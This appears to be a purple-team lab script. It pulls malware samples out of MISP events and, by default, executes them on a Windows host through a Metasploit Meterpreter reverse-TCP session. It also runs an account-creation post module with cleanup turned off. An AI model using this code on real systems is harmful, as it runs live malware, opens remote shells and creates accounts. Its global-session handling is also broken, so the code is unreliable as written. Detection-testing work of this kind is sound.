from pymisp import PyMISP, MISPEvent
import json
import jmespath
from pymetasploit3.msfrpc import MsfRpcClient
from tenacity import retry, stop_after_delay, wait_fixed
import yaml
import base64
import zipfile

with open('config.yml', 'r') as file:
    config = yaml.safe_load(file)

MSF_SERVER = config['msf']['server']
MSF_PASSWORD = config['msf']['password']
MSF_RPC_PORT = config['msf']['rpc_port']
MSF_LHOST = config['msf']['LHOST']
MSF_LPORT = config['msf']['LPORT']
MISP_URL = config['misp']['url']
MISP_TOKEN = config['misp']['api_token']
PAYLOAD_DOWNLOAD_PATH = config['misp']['payload_download_path']

main_msf_session_key = 1
main_msf_session = None
main_shell = None

# Initialize MSF Connection
@retry(wait=wait_fixed(5))
def init_msf():
    try :
        client = MsfRpcClient(MSF_PASSWORD, port=MSF_RPC_PORT, server=MSF_SERVER, ssl=True)
        print("[*]  Connected to Metasploit")
        return client
    except Exception as e:
        print("[-] Failed to connect to Metasploit")
        exit(0)
    return None

# Initialize MISP Connection
@retry(wait=wait_fixed(5))
def init_misp():
    try:
        misp = PyMISP(MISP_URL, MISP_TOKEN)
        print("[*]  Connected to MISP")
        return misp
    except Exception as e:
        print("[-] Failed to connect to MISP")
        exit(0)
    return None

# Read a given MISP event
def read_misp_event(misp, event_id):
    print()
    print(f"[*] Reading Event #{event_id}")
    event = misp.get_event(event_id)
    event = event['Event']

    attribute_galaxy_clusters = jmespath.search("Attribute[].Galaxy[].GalaxyCluster[]", event) 
    event_galaxy_clusters = jmespath.search("Galaxy[].GalaxyCluster[]", event)
    object_galaxy_clusters = jmespath.search("Object[].Attribute[].Galaxy[].GalaxyCluster[]", event)
    payloads = jmespath.search("Object[].Attribute[?type=='malware-sample'][]", event)
    galaxy_clusters = object_galaxy_clusters + attribute_galaxy_clusters + event_galaxy_clusters

    # Get MITRE TTPs
    print()
    print("[*] Found below MITRE ATT&CK TTPs:")
    for item in galaxy_clusters:
        print(f"{item['value']}")

        # purple

    # Get malware samples
    print()
    print("[*] Found below Malware Samples")
    for item in payloads:
        print(f"#{item['id']} : {item['value']}")
        payload_data = item['data']
        download_misp_payload(item)


def download_misp_payload(payload, execute=True):
    
    name, hash = payload['value'].split('|')
    with open(f'{PAYLOAD_DOWNLOAD_PATH}/{name}.zip', 'wb') as w_payload:
        w_payload.write(base64.b64decode(payload['data']))
    
    with zipfile.ZipFile(f'{PAYLOAD_DOWNLOAD_PATH}/{name}.zip') as zip_file:
        zip_file.extractall(pwd=b"infected", path=PAYLOAD_DOWNLOAD_PATH)

    if execute:
        print(main_shell.run_shell_cmd_with_output(f"C:/Users/vagrant/vagrant_data/{hash}", None))

# Connect to meterpreter
@retry(stop=stop_after_delay(300))
def meterpreter_connect(client):
    print()
    print("[*] Configuring Metasploit Exploit...")
    exploit = client.modules.use('exploit', 'multi/handler')
    payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
    payload['LHOST'] = MSF_LHOST
    payload['LPORT'] = MSF_LPORT

    console_id = client.consoles.console().cid
    console = client.consoles.console(console_id)
    print("[*] Listening for connections...")
    console.run_module_with_output(exploit, payload=payload)

    print()
    print("[*] Running shell commands:\n")
    sessions = client.sessions.list
    main_msf_session_key = list(sessions.keys())[0]
    main_msf_session = sessions[main_msf_session_key]
    print(f"[*] Selecting Session {main_msf_session_key}")
    main_shell = client.sessions.session(main_msf_session_key)
    print(main_shell.run_shell_cmd_with_output("net accounts", None))  

def run_t1136(client):
    exploit = client.modules.use('post', 'windows/purple/t1136')
    exploit['SESSION'] = main_msf_session_key
    exploit['USERNAME'] = "test-t1136"
    exploit['CLEANUP'] = False
    console_id = client.consoles.console().cid
    console = client.consoles.console(console_id)
    console.run_module_with_output(exploit)


def main():
    # msf_client = init_msf()
    misp_client = init_misp()
    misp_event_id = 4
    read_misp_event(misp_client, misp_event_id)
    # meterpreter_connect(msf_client)

main()
